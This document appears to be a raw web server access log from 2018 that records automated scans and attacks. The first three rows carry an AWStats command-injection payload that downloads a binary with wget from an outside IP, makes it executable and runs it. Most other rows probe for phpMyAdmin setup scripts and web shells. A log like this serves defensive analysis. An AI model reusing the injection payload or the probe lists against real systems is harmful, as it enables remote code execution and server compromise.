"IP",           "Date",              "Method", "Status", "Size",    "URI", "UA"
"96.68.165.185","30/Sep/2018:13:57:29","GET","400","0","/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
No User Agent
"96.68.165.185","30/Sep/2018:13:57:30","GET","400","0","/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
No User Agent
"96.68.165.185","30/Sep/2018:13:57:31","GET","400","0","/cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
"122.248.248.126","30/Sep/2018:19:59:30","GET","404","461","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:31","GET","404","461","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:31","GET","404","462","/_phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:32","GET","404","456","/admin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:32","GET","404","450","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:33","GET","404","454","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:13","GET","404","464","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:14","GET","404","464","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:15","GET","404","465","/_phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:15","GET","404","459","/admin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:16","GET","404","453","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"140.143.157.138","30/Sep/2018:20:29:17","GET","404","457","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:12","GET","404","464","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:13","GET","404","464","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:13","GET","404","465","/_phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:14","GET","404","459","/admin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:15","GET","404","453","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"54.169.80.147","01/Oct/2018:01:00:23","GET","404","457","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"119.29.130.253","01/Oct/2018:02:16:48","GET","404","464","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"119.29.130.253","01/Oct/2018:02:17:08","GET","404","464","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"94.191.25.26","01/Oct/2018:04:41:14","GET","404","500","/test.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:23","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:40","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:43","GET","404","509","/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:43","GET","404","520","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:44","GET","404","520","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:44","GET","404","525","/phpmyadmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:41:45","GET","404","525","/phpMyAdmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
"94.191.25.26","01/Oct/2018:04:42:00","POST","404","505","/wp-admins.php"," Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"94.191.25.26","01/Oct/2018:04:42:03","POST","404","502","/wshell.php"," Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"94.191.25.26","01/Oct/2018:04:42:04","POST","404","502","/xshell.php"," Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"94.191.25.26","01/Oct/2018:04:42:43","POST","404","500","/test.php"," Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"94.191.25.26","01/Oct/2018:04:43:04","POST","404","500","/test.php"," Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
"94.191.25.26","01/Oct/2018:04:43:58","GET","404","511","/phpmyadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:43:59","GET","404","511","/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:06","GET","404","507","/admin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:07","GET","404","509","/dbadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:07","GET","404","516","/web/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:08","GET","404","511","/admin/pma/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:11","GET","404","511","/admin/PMA/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:11","GET","404","513","/admin/mysql/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:12","GET","404","514","/admin/mysql2/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:12","GET","404","518","/admin/phpmyadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:13","GET","404","518","/admin/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:14","GET","404","519","/admin/phpmyadmin2/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:15","GET","404","512","/mysqladmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:15","GET","404","513","/mysql-admin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:15","GET","404","510","/phpadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:16","GET","404","510","/phpAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:19","GET","404","513","/phpmyadmin0/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:19","GET","404","513","/phpmyadmin1/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:20","GET","404","513","/phpmyadmin2/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:21","GET","404","518","/phpMyAdmin-4.4.0/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:23","GET","404","509","/myadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:23","GET","404","510","/myadmin2/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:23","GET","404","518","/xampp/phpmyadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:24","GET","404","516","/phpMyadmin_bak/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:27","GET","404","516","/www/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:27","GET","404","518","/tools/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:28","GET","404","516","/phpmyadmin-old/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:28","GET","404","515","/phpMyAdminold/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:29","GET","404","516","/phpMyAdmin.old/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:31","GET","404","522","/claroline/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:31","GET","404","518","/typo3/phpmyadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:32","GET","404","523","/phpmyadmin/phpmyadmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:35","GET","404","523","/phpMyAdmin/phpMyAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:36","GET","404","514","/phpMyAdmin__/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:37","GET","404","518","/phpMyAdmin+++---/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"94.191.25.26","01/Oct/2018:04:44:40","GET","404","510","/shaAdmin/index.php"," Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
"213.145.134.164","29/Sep/2018:06:33:59","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"213.145.134.164","29/Sep/2018:06:34:00","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"203.113.174.8","29/Sep/2018:09:47:02","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"203.113.174.8","29/Sep/2018:09:47:02","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"14.34.148.34","29/Sep/2018:09:59:50","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"14.34.148.34","29/Sep/2018:09:59:51","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"200.29.191.76","29/Sep/2018:10:00:46","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"200.29.191.76","29/Sep/2018:10:00:47","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"74.50.210.132","29/Sep/2018:10:24:57","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"74.50.210.132","29/Sep/2018:10:24:58","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"139.199.248.209","29/Sep/2018:11:54:20","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"139.199.248.209","29/Sep/2018:11:54:20","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"45.40.196.55","29/Sep/2018:16:14:12","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"45.40.196.55","29/Sep/2018:16:14:16","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"116.196.115.63","29/Sep/2018:16:33:44","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"116.196.115.63","29/Sep/2018:16:33:45","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"77.76.205.132","29/Sep/2018:16:55:03","GET","404","465","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"77.76.205.132","29/Sep/2018:16:55:03","GET","404","465","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"77.76.205.132","29/Sep/2018:16:55:03","GET","404","454","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"77.76.205.132","29/Sep/2018:16:55:03","GET","404","458","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"212.33.32.184","29/Sep/2018:17:15:27","GET","404","465","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"212.33.32.184","29/Sep/2018:17:15:28","GET","404","465","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"212.33.32.184","29/Sep/2018:17:15:28","GET","404","454","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"212.33.32.184","29/Sep/2018:17:15:28","GET","404","458","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"104.168.151.140","29/Sep/2018:18:16:06","HEAD","404","140","/static/admin/images/login_logo.png"," Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
"104.168.151.140","29/Sep/2018:18:16:46","HEAD","404","140","/static/admin/images/login_logo.png"," Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
"104.168.151.140","29/Sep/2018:18:16:57","HEAD","404","140","/static/admin/images/login_logo.png"," Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
"104.168.151.140","29/Sep/2018:18:17:05","HEAD","404","140","/static/admin/images/login_logo.png"," Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
"221.217.53.201","29/Sep/2018:21:03:59","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"221.217.53.201","29/Sep/2018:21:04:02","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"210.94.133.248","30/Sep/2018:00:11:26","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"210.94.133.248","30/Sep/2018:00:11:26","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"47.74.0.246","30/Sep/2018:00:52:49","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"47.74.0.246","30/Sep/2018:00:52:50","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"159.226.20.33","30/Sep/2018:01:28:07","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"159.226.20.33","30/Sep/2018:01:28:08","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"146.88.74.158","30/Sep/2018:04:19:50","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"146.88.74.158","30/Sep/2018:04:19:54","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"218.241.251.155","30/Sep/2018:04:41:53","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"218.241.251.155","30/Sep/2018:04:41:58","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"159.89.142.172","30/Sep/2018:05:12:01","GET","404","497","/w00tw00t.at.blackhats.romanian.anti-sec:)"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:01","GET","404","483","/phpmadmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:01","GET","404","484","/phpMyAdmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:01","GET","404","484","/mysqladmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:02","GET","404","468","/phpmyadmin2/"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","468","/phpmyadmin3/"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","468","/phpmyadmin4/"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","477","/pma/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","481","/myadmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","481","/MyAdmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","479","/mysql/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","493","/phpMyAdmin-2.10.0.0/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:03","GET","404","492","/phpMyAdmin-2.11.11/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:04","GET","404","494","/phpMyAdmin-2.11.11.3/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:04","GET","404","507","/phpMyAdmin-3.0.0.0-adll-languages/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:04","GET","404","481","/dbadmin/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:05","GET","404","476","/db/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:05","GET","404","473","/scripts/setup.php"," ZmEu",
"159.89.142.172","30/Sep/2018:05:12:05","GET","404","486","/phpMyAdmin-2/scripts/setup.php"," ZmEu",
